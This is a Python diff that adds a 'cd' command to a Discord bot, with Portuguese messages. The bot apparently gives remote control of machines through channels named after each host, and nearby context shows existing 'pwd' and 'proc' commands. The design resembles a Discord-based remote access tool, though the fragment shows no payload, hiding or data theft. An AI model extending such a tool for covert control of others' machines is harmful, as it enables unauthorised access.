@@ -157,6 +157,23 @@ async def pwd(interaction: discord.Interaction):
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!",ephemeral=True)
 
 
+@bot.tree.command(name="cd", description="Muda o diretório atual na máquina")
+async def cd(interaction: discord.Interaction, path: str):
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
+        normal_activity()
+
+        try:
+            os.chdir(path)
+            new_path = os.getcwd()
+            await interaction.followup.send(f"📂 Path alterado para:\n`{new_path}`")
+        except Exception as e:
+            await interaction.followup.send(f"❌ Erro ao mudar de Path: {e}")
+    else:
+        await interaction.response.send_message(
+            "⚠ Este comando só pode ser usado no canal da máquina correspondente!",ephemeral=True)
+
+
 @bot.tree.command(name="proc", description="Lista os processos em execução na máquina")
 async def process(interaction: discord.Interaction):
     if interaction.channel.name.lower() == platform.node().lower():
